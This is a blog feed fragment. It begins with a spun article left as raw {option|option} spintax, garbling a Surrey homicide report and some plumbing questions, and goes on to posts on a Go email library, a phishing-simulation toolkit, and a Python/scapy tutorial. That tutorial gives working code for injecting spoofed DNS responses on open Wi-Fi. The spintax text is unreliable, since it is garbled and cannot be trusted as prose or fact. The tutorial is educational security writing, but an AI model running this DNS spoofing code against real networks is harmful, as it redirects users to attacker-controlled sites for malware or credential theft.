</span><span class='line'>"I {will do|is going to do|can do|will perform} {the|the actual|the particular|your} {shows|exhibits|displays|demonstrates}, {as usual|as always} {I will|I'll|I am going to|Let me} {meet|fulfill|satisfy|meet up with} {everyone|everybody|every person|anyone} {afterwards|later on|soon after|after}, {and I will|and i'll} {NOT be|'t be|Not|Stop} {jumping|leaping|bouncing|moving} {off|away|away from|off of} {anything|something|anything at all|everything}. {I am|I'm|I will be|We are} {deeply|seriously|profoundly|significantly} {sorry|i'm sorry|remorseful|i am sorry} {and I|and that i|and i also|i} {promise|guarantee|assure|offer} {to learn|to understand|to find out|to master} {from this|out of this|using this|because of this} {mistake|error|blunder|oversight},{"|Inch|Inches|In .} {he said|he explained|he was quoted saying|he stated}./p&gt;
</span><span class='line'>
</span><span class='line'>{Police|Law enforcement|Law enforcement officials|Authorities} {find|discover|locate|uncover} {2|Two|A couple of|Only two} {more|much more|a lot more|far more} corpses {in|within|inside|throughout} Surrey
</span><span class='line'>Sgt. {PT|Rehabilitation|Therapist} Wednesdayinan {area of|section of|part of|division of} {South|Southern|To the south|Southerly} Surrey {that has been|that's been|which has been|that is} {used|utilized|employed|utilised} {twice|two times|2 times|double} {this year|this season|this coming year|in 2010} {as a|like a|being a|as being a} {dumping ground|drop zone} {for|with regard to|regarding|pertaining to} {bodies|physiques|body|systems}.{The|The actual|The particular|Your} {integrated|incorporated|built-in|included} {homicide|murder|killing|kill} {investigation|analysis|study|exploration} {team|group|staff|crew} {was|had been|has been|ended up being} {called|known as|referred to as|named} {Wednesday|Thursday|Friday|Wed} {morning|early morning|morning hours|day} {to an|for an|to a|with an} {area of|section of|part of|division of} Colebrook {Road|Street|Highway|Path} {in|within|inside|throughout} Surrey {that has become|that is|that has been|this is certainly} {a|the|any|a new} {dumping ground|drop zone} {for|with regard to|regarding|pertaining to} {bodies|physiques|body|systems}. (CBC){More|Much more|A lot more|Far more} {police|law enforcement|law enforcement officials|authorities} {were|had been|have been|ended up} {then|after that|next|and then} {called in|contacted|called}, {and a|along with a|plus a|as well as a} {police|law enforcement|law enforcement officials|authorities} {dog|canine|puppy|pet} {team|group|staff|crew} {located|situated|positioned|found} {a woman's|a ladies|a lady's|a female's} {body|physique|entire body|system} {as well|too|also|at the same time} {a short distance|ten or twenty yards} {away|aside|absent|apart}.{Pound|Lb|Single pound|Lb .} {said|stated|mentioned|explained} {both|each|equally|the two} {victims|sufferers|patients|subjects} {appeared to|seemed to|did actually|gave the impression to} {have|possess|have got|get} {met|fulfilled|satisfied|achieved} {with|along with|together with|using} {foul|bad|nasty|strong} {play|perform|enjoy|participate in}. {Police have|Mother and father|Weed|Cannabis} {not yet been|not|to be} {able to|in a position to|capable of|capable to} {identify|determine|recognize|discover} {them|all of them|these|these people}."Until {the|the actual|the particular|your} {identity|identification|id|personality} {has been|continues to be|may be|has become} {determined|established|decided|identified}, {investigators|detectives|researchers|private investigators} {will not|won't|is not going to|will not likely} {know the|be aware of|understand the|have in mind the} {connection|link|relationship|interconnection}, {if any|or no}, {today's|present day|the current|modern day} {victims|sufferers|patients|subjects} {have to|need to|must|ought to} {each other|one another|the other person|the other} {or to|in order to|or|as well as to} {the other|another|one other|the opposite} {two|2|a couple of|a pair of} {victims|sufferers|patients|subjects} {found|discovered|identified|located} {recently|lately|not too long ago|just lately} {in this area|in this region|in this field|of this type},{"|Inch|Inches|In .} {Pound|Lb|Single pound|Lb .} {said|stated|mentioned|explained} {in a|inside a|in the|within a} {written|created|composed|published} {statement|declaration|assertion|affirmation}.{2|Two|A couple of|Only two} {bodies|physiques|body|systems} foundearlier {in|within|inside|throughout} 2013IHIT {investigators|detectives|researchers|private investigators} {were|had been|have been|ended up} {already|currently|previously|by now} {called|known as|referred to as|named} {out|away|out there|out and about} {twice|two times|2 times|double} {this year|this season|this coming year|in 2010} {to|in order to|to be able to|for you to} Colebrook {Road|Street|Highway|Path}, {a remote|an online|an isolated|a secluded} {rural|non-urban|countryside|outlying} {stretch|extend|stretch out|expand} {near the|close to the|nearby the|at the} {Serpentine|Courbe} {River|Water|Lake|Pond}, {south|southern|to the south|southerly} {of the|from the|with the|in the} {Panorama|Surroundings|Vista} {Ridge|Form|Shape|Rdg} {neighbourhood|area|local community|community} andnorth {of|associated with|regarding|involving} {Mud|Dirt|Off-road|Will get} {Bay|These types of|Fresh|These kinds of}.Colebrook {Road|Street|Highway|Path} {and|as well as|and also|along with} 125A StreetIn {February|Feb|Feb .|January}, abadly {burned|burnt|used up|burned up} {body|physique|entire body|system} {was found|was discovered|is discovered} {off|away|away from|off of} Colebrook Roadnear 125th {Street|Road|Avenue|Block}. Policeidentified {that|which|in which|that will} {victim|target|sufferer|prey} {as|because|since|while} {29|Twenty nine|30|28} {year old|years old|yr old|year-old} Amritpal Saran, {of|associated with|regarding|involving} Delta. {Police|Law enforcement|Law enforcement officials|Authorities} {said|stated|mentioned|explained} {the man|the person|the guy|he} {was|had been|has been|ended up being} {known to|recognized to|proven to|seen to} {them|all of them|these|these people}, {but|however|yet|nevertheless} {had no|didn't have|didn't have any|did not have any} {known|recognized|identified|acknowledged} {gang|bunch|team|company} {affiliations|organizations|connections|links}.{Police|Law enforcement|Law enforcement officials|Authorities} {were|had been|have been|ended up} {also called|also known as|also referred to as|otherwise known as} {to|in order to|to be able to|for you to} investigatea {violent|chaotic|severe|crazy} {attack|assault|strike|invasion} {on a|on the|over a|with a} Surrey {sex|intercourse|sexual intercourse|making love} {trade|industry|business|buy and sell} {worker|employee|member of staff|staff member} {along|together|alongside|coupled} Colebrook {Road|Street|Highway|Path} {in|within|inside|throughout} {October|Oct|March|April}.{In|Within|Inside|Throughout} {February|Feb|Feb .|January}, {police|law enforcement|law enforcement officials|authorities} {released|launched|introduced|unveiled} {sketches|drawings|paintings|images} {of|associated with|regarding|involving} {two|2|a couple of|a pair of} {South|Southern|To the south|Southerly} {Asian|Oriental|Hard anodized cookware|Cookware} menwho allegedlydrove {her|the woman's|the girl|your ex} toColebrook {Road|Street|Highway|Path} {near|close to|around|in close proximity to} 128th {Street|Road|Avenue|Block}, {and|as well as|and also|along with} {physically|bodily|actually|literally} {and|as well as|and also|along with} {sexually|while making love|intimately|in the bedroom} {assaulted|attacked|bombarded|mauled} {her|the woman's|the girl|your ex}. {She|The lady|Your woman|The girl} {was|had been|has been|ended up being} {taken to|come to|taken up|delivered to} {hospital|medical center|clinic|healthcare facility} {with|along with|together with|using} {serious|severe|significant|critical} {injuries|accidents|accidental injuries|incidents}.
</span><span class='line'>
</span><span class='line'>{Pressure|Stress|Strain|Force} {rating|score|ranking|standing} {for 3|for several}
</span><span class='line'>{Check out|Take a look at|Have a look at|Look at} {some|a few|several|a number of} {similar|comparable|related|equivalent} {questions|concerns|queries|inquiries}!
</span><span class='line'>{How can I|How do i|How could i|How to} {reduce|decrease|lessen|minimize} {a|the|any|a new} 4" {cast iron|surefire|certain|iron} {pipe|water pipe|tube|water line} {opening|starting|beginning|opening up} {to|in order to|to be able to|for you to} 2" {pvc|pvc material|faux wood|imitation wood} pipe&gt; [ {2|Two|A couple of|Only two} {Answers|Solutions|Responses|Replies} {]|}
</span><span class='line'>{The last|The final|The past|The very last} {owner|proprietor|operator|seller} {put a|place a|convey a} 2' {pvc|pvc material|faux wood|imitation wood} {pipe|water pipe|tube|water line} {into a|right into a|in to a|in a} 4" {cast iron|surefire|certain|iron} {opening|starting|beginning|opening up}   {it looks like|it appears as though|it appears like|it appears as if} {they just|they simply|they only|they merely} {filled|stuffed|crammed|loaded} {the opening|the outlet} {with|along with|together with|using} {plumbers|local plumbers|plumbing technicians|plumbing engineers} putty   {i am|i'm|i will be|we are} {looking to|seeking to|trying to|planning to} {repair it|do the repair|correct it|remedy it} {properly|correctly|effectively|appropriately}   {what can|so what can|exactly what can|exactly what do} {I use|I personally use|I take advantage of|I prefer} {to go into|to enter|to penetrate|to get in} {the|the actual|the particular|your} {cast iron|surefire|certain|iron} 4"opening {to reduce|to lessen|to cut back|to scale back} {it|this|that|the idea} {to|in order to|to be able to|for you to} 2" {opening|starting|beginning|opening up} {which I|that we|that i|i} {can then|may then|are able to|will then} {attach|connect|affix|add} {3|Three|Several|Three or more}? {Thank you|Thanks|Many thanks|Thanks a lot}
</span><span class='line'>{Replace|Substitute|Change|Exchange} 3" {ABS|Ab muscles|Abdominal muscles|Stomach muscles} {pipe|water pipe|tube|water line} {bonded|glued|fused|insured} {into|in to|directly into|straight into} {cast iron|surefire|certain|iron} cleanout {pipe|water pipe|tube|water line} [ {1|One|A single|One particular} {Answers|Solutions|Responses|Replies} {]|}
</span><span class='line'>{Need to|Have to|Must|Should} {connect|link|hook up|join} {new|brand new|fresh|brand-new} 3" {ABS|Ab muscles|Abdominal muscles|Stomach muscles} {pipe|water pipe|tube|water line} {to an|for an|to a|with an} {old|aged|outdated|previous} {cast iron|surefire|certain|iron} cleanout {pipe|water pipe|tube|water line} {just|simply|merely|only} {above|over|previously mentioned|earlier mentioned} {cement|concrete|bare concrete|bare cement} {floor|ground|flooring|floorboards}. {Need to|Have to|Must|Should} {create a|produce a|develop a|build a} {new|brand new|fresh|brand-new} cleanout {in|within|inside|throughout} 3" {ABS|Ab muscles|Abdominal muscles|Stomach muscles} {that will be|that'll be|which will be|that is to be} 12" {above the|over the|across the|higher than the} {old|aged|outdated|previous} {cast iron|surefire|certain|iron} cleanout {so that|to ensure that|in order that|to ensure} {a main|a primary|a principal|an important} {sewer line|sewage} {blockage|obstruction|congestion|clog} {between the|between your|involving the|relating to the} {main|primary|principal|major} {stack|bunch|collection|pile} {the street|the road|the trail|the path} {sewer|sewer line|sewage} {some|a few|several|a number of} {25|Twenty five|Twenty-five|30} {feet|ft|toes|foot} {away|aside|absent|apart} {can be removed|can be taken off|is easy to remove|are easy to remove}. {Had to|Needed to|Were required to|Was required to}.
</span><span class='line'>{For|With regard to|Regarding|Pertaining to} {600|Six hundred|Six-hundred|1000} {rating|score|ranking|standing} {pipe|water pipe|tube|water line} {what is the|what's the|is there a|exactly what is the} {schedule|routine|timetable|plan} {require|need|call for|demand} {for|with regard to|regarding|pertaining to} 2" NB {pipe|water pipe|tube|water line} [ {0|Zero|2|3} {Answers|Solutions|Responses|Replies} {]|}
</span><span class='line'>{Capacity|Capability|Ability|Potential} {of|associated with|regarding|involving} 6" {schedule|routine|timetable|plan} {40|Forty|45|Forty five} {pipe|water pipe|tube|water line} {at|from|with|in} {3|Three|Several|Three or more} {psi|pounds per square inch}. {Natural gas|Gas|Propane|Gas main} {pressure|stress|strain|force} [ {1|One|A single|One particular} {Answers|Solutions|Responses|Replies} {]|}
</span><span class='line'>{Capacity|Capability|Ability|Potential} {of|associated with|regarding|involving} 6" {schedule|routine|timetable|plan} {40|Forty|45|Forty five} {pipe|water pipe|tube|water line} {at|from|with|in} {3|Three|Several|Three or more} {psi|pounds per square inch}. {And|As well as|And also|Along with}, {where can I|how can i|can anyone help me|i'm looking to} {find a|look for a|locate a|discover a} {pressure|stress|strain|force} {table|desk|stand|kitchen table} {for|with regard to|regarding|pertaining to} {capacities|capabilities|sizes|drives} {of various|of numerous|of varied|of assorted} {size|dimension|dimensions|measurement} {pipes|plumbing|water lines|piping} {at|from|with|in} {various|numerous|different|a variety of} {inlet|intake|inlt} {pressures|demands|challenges|difficulties}
</span><span class='line'>{Adding|Including|Incorporating|Introducing} {a|the|any|a new} {PVC|Pvc material|Faux wood|Imitation wood} "Y" {to a|to some|with a|into a} {underground|subterranean|undercover|subway} {Cast iron|Surefire|Certain|Iron} {pipe|water pipe|tube|water line} [ {1|One|A single|One particular} {Answers|Solutions|Responses|Replies} {]|}
</span><span class='line'>{I have a|I've got a|I've a|I own a} {house|home|residence|property} {built in|built-in|integrated|internal} {1962|'62}. {The|The actual|The particular|Your} {cast iron|surefire|certain|iron} {waste|squander|waste materials|spend} {pipe|water pipe|tube|water line} {runs|operates|works|goes} {under the|underneath the|beneath the|within the} {concrete slab|layer of concrete} {in the|within the|inside the|from the} {basement|cellar|downstairs room|attic}. {I have|I've|We have|We've} {already|currently|previously|by now} {dug|made|excavated|finished} {and|as well as|and also|along with} {confirmed|verified|established|validated} {the location|the place|the positioning|the venue} {I want to|I wish to|I would like to|I must} {cut|reduce|minimize|lower} {a section|a piece|an area|a bit} {out of the|from the|out from the|out of your} {pipe|water pipe|tube|water line} {and|as well as|and also|along with} {install a|use a|put in a|purchase a} "Y" {connector|connection|plug} {and|as well as|and also|along with} {run|operate|work|manage} {new|brand new|fresh|brand-new} {plastic|plastic material|plastic-type|plastic-type material} {waste|squander|waste materials|spend} {pipes|plumbing|water lines|piping} {to a new|to a different|to an alternative|completely to another} {bath|bathtub|shower|bath tub}. {I have seen|I've come across|I have come across|I know of} {PVC|Pvc material|Faux wood|Imitation wood} {connectors|fittings|connections|band} {that|which|in which|that will}./p&gt;</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Building GoPhish - How to Send Email with Go]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/01/03/building-gophish-how-to-send-email-with-go/"/>
    <updated>2014-01-03T22:06:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/01/03/building-gophish-how-to-send-email-with-go</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/go_email.png"/></p>

<h3>Introduction</h3>

<p>I&rsquo;ve been playing around with Go for about a month now, and I&rsquo;ve <em>really</em> grown to like it. After getting used to the syntax and remembering what a pointer is for (thanks, Python), Go has become a favorite language to develop with. I&rsquo;m even using it for the <a href="http://www.matasano.com/articles/crypto-challenges/">Matasano Crypto Challenges</a> (which are <em>awesome</em>).</p>

<p>While the standard library in Go is definitely robust, being a young language, there are a few niceties that aren&rsquo;t yet included. Sending email is one of them. Don&rsquo;t get me wrong, Go has a wonderful <a href="http://golang.org/pkg/net/smtp/">SMTP</a> package, <a href="http://golang.org/pkg/mime/">MIME</a> package, and even a <a href="http://golang.org/pkg/net/mail/">Mail</a> package (which <em>only</em> parses existing email messages). However, there is no library to actually <strong>create</strong> emails in a meaningful way. Since <a href="https://github.com/jordan-wright/gophish">Gophish</a> relies heavily on sending emails, I&rsquo;ve sought to change this. And, after reading more RFC&rsquo;s than I normally prefer, I believe I&rsquo;ve created a package that provides intuitive, robust, and flexible email creation and sending called <a href="https://github.com/jordan-wright/email">email</a>.</p>

<p>Let&rsquo;s see how to use it.</p>

<!--more-->


<h3>How You <em>Normally</em> Send an Email in Go</h3>

<p>To send email in Go, one needs to:</p>

<ul>
<li>Create a byte slice of the email message (conforming to all needed RFC&rsquo;s)</li>
<li>Send this email using the SMTP library</li>
</ul>


<p>The second part is easy, the first part is not. Sure, sending a simple text message may be straight forward, but things get tricky when you want to cover things like supporting HTML and text body types, attaching files, supporting CC and BCC recipients, etc.</p>

<h3>Sending Email Using the <code>email</code> Package</h3>

<p>To make this easier, I have created the <a href="https://github.com/jordan-wright/email"><code>email</code></a> package (full documentation <a href="http://godoc.org/github.com/jordan-wright/email">here</a>). This package allows users to create emails with a variety of options, and send them easily. Examples say more than I can, so here is some code showing how to use the package.</p>

<h4>Installing the Package</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>go get github.com/jordan-wright/email</span></code></pre></td></tr></table></div></figure>


<h4>Creating a New Email</h4>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kn">package</span> <span class="nx">main</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="s">&quot;github.com/jordan-wright/email&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="kd">func</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">e</span> <span class="o">:=</span> <span class="nx">email</span><span class="p">.</span><span class="nx">NewEmail</span><span class="p">()</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Setting the Subject, To, From, Bcc, Cc</h4>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Subject</span> <span class="p">=</span> <span class="s">&quot;Awesome Subject&quot;</span>
</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">From</span> <span class="p">=</span> <span class="s">&quot;Jordan Wright &lt;test@gmail.com&gt;&quot;</span>
</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">To</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&quot;test@example.com&quot;</span><span class="p">}</span>
</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Bcc</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&quot;test_bcc@example.com&quot;</span><span class="p">}</span>
</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Cc</span> <span class="p">=</span> <span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">&quot;test_cc@example.com&quot;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Setting the Content (HTML &amp; Text)</h4>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Text</span> <span class="p">=</span> <span class="s">&quot;Text Body is, of course, supported!&quot;</span>
</span><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">HTML</span> <span class="p">=</span> <span class="s">&quot;&lt;h1&gt;Fancy Html is supported, too!&lt;/h1&gt;&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Attaching a File</h4>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">AttachFile</span><span class="p">(</span><span class="s">&quot;test.txt&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can also use the <a href="http://godoc.org/github.com/jordan-wright/email#Email.Attach"><code>Attach</code></a> function to attach content directly from an io.Reader.</p>

<h4>Sending the Email (Using Gmail as Example)</h4>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="nx">e</span><span class="p">.</span><span class="nx">Send</span><span class="p">(</span><span class="s">&quot;smtp.gmail.com:587&quot;</span><span class="p">,</span> <span class="nx">smtp</span><span class="p">.</span><span class="nx">PlainAuth</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">,</span> <span class="s">&quot;test@gmail.com&quot;</span><span class="p">,</span> <span class="s">&quot;password123&quot;</span><span class="p">,</span> <span class="s">&quot;smtp.gmail.com&quot;</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Conclusion</h4>

<p>I hope this package will be useful to those that need to send email from their Go projects. I am excited to continue working on Gophish &ndash; you can expect a big update soon! Until then, as always, feel free to leave any questions or comments below.</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Building Gophish - Day 1]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/11/29/building-gophish-day-1/"/>
    <updated>2013-11-29T16:15:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/11/29/building-gophish-day-1</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/gophish.png"/></p>

<h3>Introduction</h3>

<p>Since the <a href="http://sptoolkit.com/the_end.php">Simple Phishing Toolkit (SPT)</a> was discontinued, I&rsquo;ve wanted to create a simple, effective, and open-source phishing toolkit. In recent years, we&rsquo;ve seen a rise in spear-phishing attacks targeting large organizations, most of which are largely successful. The goal of this toolkit will be to provide businesses and penetration testers with the ability to quickly and easily perform in-house or contracted phishing engagements, and track the responses to see where improvements can be made. This toolkit will be called <a href="https://github.com/jordan-wright/gophish">gophish</a>.</p>

<p>In addition to this, I&rsquo;ve been casually poking around at <a href="http://golang.org/"><code>go</code></a> for a while now, and have decided it would be good to finally put it to use in a larger project. I&rsquo;m a fan of seeing the steady development and updates of projects as they are created. I believe it can help keep the developer motivated and the users informed and involved, so this is what I&rsquo;m going to do. Hopefully, these posts will allow others to learn alongside me, as well as spur improvements from experienced <code>go</code> developers so that <a href="https://github.com/jordan-wright/gophish">gophish</a> can be the best product possible.</p>

<p>With that being said &ndash; let&rsquo;s get started!</p>

<!--more-->


<h3>Why Go?</h3>

<p>In addition to learning a new language, here are a few reasons why I chose <code>go</code> for this project:</p>

<ul>
<li>Cross-compile binaries by default</li>
<li>Only distribute one binary &ndash; just download and run (no more dependencies!)</li>
<li>Low memory overhead</li>
</ul>


<p>I believe the second point is crucial, in that it makes it <em>dead-simple</em> to get up and running. Existing solutions (such as SPT or <a href="https://github.com/pentestgeek/phishing-frenzy">Phishing Frenzy</a>) require an already running webserver or other framework installation.</p>

<h3>Gophish Requirements</h3>

<p>Here are a few of the things I want to be able to do with gophish:</p>

<ul>
<li>Create &ldquo;campaigns&rdquo;, each of which are a simulation of a phishing attack</li>
<li>Create HTML or text templates for phishing emails, providing as many as possible built-in</li>
<li>Allow users to clone existing sites for use in templates</li>
<li>Allow users to import and group phishing targets easily</li>
<li>Provide intuitive analytics, and allow reports to be exported</li>
<li>If possible, integrate with existing products such as the Social Engineer&rsquo;s Toolkit</li>
</ul>


<h3>Getting Started</h3>

<p>I am <em>tentatively</em> planning on creating a REST API for all backend functionality, so as to allow developers to automate gophish. This will also make it easier to separate front-end logic from the backend.</p>

<p>I have looked around at different <code>go</code> web frameworks, and I am going to start by taking a look at the tools provided in the <a href="http://www.gorillatoolkit.org/">Gorilla toolkit</a>, since they seem to sit on top of the standard <code>net/http</code> library without abstracting too many things away.</p>

<p>That&rsquo;s all I have for now &ndash; stay tuned for progress updates (and a big initial commit)! And, as always, let me know if you have any questions or suggestions in the comments below!</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Wireless Attacks with Python: Part One - The "Dnspwn Attack"]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack/"/>
    <updated>2013-11-15T20:45:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/wireless_python.png"/></p>

<h3>Introduction</h3>

<p>A while back, I <a href="http://raidersec.blogspot.com/2013/01/wireless-deauth-attack-using-aireplay.html">published a post</a> on the Raidersec blog demonstrating how to perform a deauthentication attack using Python and Scapy. I enjoyed writing the post, since I got the opportunity to learn in-depth about how different wireless attacks work, beyond just learning how to exclusively use the <a href="http://www.aircrack-ng.org/">aircrack suite</a>.</p>

<p>So, with that being said, this post will kick off a short series of posts discussing how to perform common wireless attacks using Python. I hope you enjoy the posts and, as always, never hesitate to let me know if you have any comments or questions below.</p>

<!--more-->


<h3>The &ldquo;Dnspwn Attack&rdquo;</h3>

<p>The first attack we&rsquo;ll explore is what I call the &ldquo;dnspwn attack&rdquo; (since, from what I can tell, this attack was first created targeting HTTP with the &ldquo;<a href="http://airpwn.sourceforge.net/Airpwn.html">airpwn</a>&rdquo; tool, and later extended to DNS) The idea behind the attack is pretty simple:</p>

<p>Consider two people on the same open WLAN: Bob and Eve. Eve wants to get Bob to visit a malicious webpage she created so that she can install malware onto Bob&rsquo;s computer via a drive-by download, or perhaps show a spoofed website to try and steal Bob&rsquo;s credentials.</p>

<p>To do this, she remembers that she can sniff all requests coming to and from Bob&rsquo;s computer. She also knows that she is <em>closer</em> to Bob than the web server he is sending a request to. So, she decides to wait until Bob sends a web request, and see if she can send back a spoofed response pretending to come from the web server <em>before</em> the actual web server can respond. Turns out, she can. In fact, once the spoofed response is received, Bob&rsquo;s computer will likely ignore any further traffic received, including the real response!</p>

<p>Let&rsquo;s see what this would look like:</p>

<p><a href="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/diagram.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/diagram_small.png"/></a></p>

<p>So, now that we know how the attack works, let&rsquo;s automate it!</p>

<h3>Setting up the Alfa AWUS06H</h3>

<p>As was the case in my Raidersec post, we will be using the handy <a href="http://www.amazon.com/Alfa-AWUS036H-802-11b-Wireless-network/dp/B002WCEWU8">Alfa AWUS036H</a> for this attack. The first thing we want to do is to put our wireless card in monitor mode so that we can capture all traffic coming from the <code>demo_insecure</code> network.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:~# airmon-ng start wlan0</span></code></pre></td></tr></table></div></figure>


<p>Now that we have monitor mode up and running on <code>mon0</code>, let&rsquo;s start coding!</p>

<h3>Coding the Attack</h3>

<p>We will utilize the <code>scapy</code> module to perform the attack. Let&rsquo;s start by sniffing any UDP packet with a destination of port 53, and send the packet to a function called <code>send_response</code> that we will make later:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from scapy.all import *
</span><span class='line'>
</span><span class='line'>sniff(prn=lambda x: send_response(x),
</span><span class='line'>  lfilter=lambda x:x.haslayer(UDP) and x.dport == 53)</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s create a function which can parse the request for relevant information, and inject the response. We can parse the packet and create our response simply by working our way up the layers as follows:</p>

<ul>
<li>802.11 Frame &ndash; Change the &ldquo;to-ds&rdquo; flag to &ldquo;from-ds&rdquo; (our request will now be coming <em>from</em> the access point)</li>
<li>802.11 Frame &ndash; Switch the source and destination MAC addresses</li>
<li>IP Layer &ndash; Switch the source and destination IP addresses</li>
<li>UDP layer &ndash; Switch the source and destination ports</li>
<li>DNS layer &ndash; Set the &ldquo;answer&rdquo; flag(s), and append our spoofed answer</li>
</ul>


<p>Fortunately, <code>scapy</code> makes this very simple for us by abstracting away a lot of minor details (e.g. in fact, there are <em>4</em> MAC address fields in an 802.11 frame, each in a different order depending on the direction of the packet). With that being said, here&rsquo;s the code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>def send_response(x):
</span><span class='line'>  # Get the requested domain
</span><span class='line'>  req_domain = x[DNS].qd.qname
</span><span class='line'>  spoofed_ip = '192.168.2.1'
</span><span class='line'>  # Let's build our response from a copy of the original packet
</span><span class='line'>  response = x.copy()
</span><span class='line'>  # We need to start by changing our response to be "from-ds", or from the access point.
</span><span class='line'>  response.FCfield = 2L
</span><span class='line'>  # Switch the MAC addresses
</span><span class='line'>  response.addr1, response.addr2 = x.addr2, x.addr1
</span><span class='line'>  # Switch the IP addresses
</span><span class='line'>  response.src, response.dst = x.dst, x.src
</span><span class='line'>  # Switch the ports
</span><span class='line'>  response.sport, response.dport = x.dport, x.sport
</span><span class='line'>  # Set the DNS flags
</span><span class='line'>  response[DNS].qr = 1L
</span><span class='line'>  response[DNS].ra = 1L
</span><span class='line'>  response[DNS].ancount = 1</span></code></pre></td></tr></table></div></figure>


<p>Now that we&rsquo;ve set all the flags, let&rsquo;s create and append the DNS answer:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>response[DNS].an = DNSRR(
</span><span class='line'>  rrname = req_domain,
</span><span class='line'>  type = 'A',
</span><span class='line'>  rclass = 'IN',
</span><span class='line'>  ttl = 900,
</span><span class='line'>  rdata = spoofed_ip
</span><span class='line'>  )</span></code></pre></td></tr></table></div></figure>


<p>And, finally, we inject the spoofed response:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sendp(response)</span></code></pre></td></tr></table></div></figure>


